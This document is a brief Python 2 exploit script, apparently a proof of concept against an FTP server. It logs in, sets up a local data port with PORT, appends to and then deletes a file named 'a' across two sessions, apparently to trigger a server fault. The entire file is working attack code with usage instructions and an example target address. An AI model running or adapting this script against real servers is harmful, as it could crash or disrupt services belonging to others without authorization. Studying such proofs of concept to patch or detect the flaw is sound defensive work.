#!/usr/bin/python
import socket
import sys

def Usage():
    print ("Usage:  ./expl.py <serv_ip>      <Username> <password>\n")
    print ("Example:./expl.py 192.168.48.183 anonymous anonymous\n")
if len(sys.argv) <> 4:
        Usage()
        sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    test_string="a"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] "+ r
    sock.send("user %s\r\n" %username)
    print "[-] "+ ("user %s\r\n" %username)
    r=sock.recv(1024)
    print "[+] "+ r
    sock.send("pass %s\r\n" %passwd)
    print "[-] "+ ("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] "+ r

    sock_data.bind(('127.0.0.1',31339))
    sock_data.listen(1)

    sock.send("PORT 127,0,0,1,122,107\r\n")
    print "[-] "+ ("PORT 127,0,0,1,122,107\r\n")
    r=sock.recv(1024)
    print "[+] "+ r

    sock.send("APPE "+ test_string +"\r\n")
    print "[-] "+ ("APPE "+ test_string +"\r\n")
    r=sock.recv(1024)
    print "[+] "+ r



    sock.close()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] "+ r
    sock.send("user %s\r\n" %username)
    print "[-] "+ ("user %s\r\n" %username)
    r=sock.recv(1024)
    print "[+] "+ r
    sock.send("pass %s\r\n" %passwd)
    print "[-] "+ ("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] "+ r

    sock.send("DELE "+ test_string +"\r\n")
    print "[-] "+ ("DELE "+ test_string +"\r\n")
    r=sock.recv(1024)
    print "[+] "+ r

    sys.exit(0);

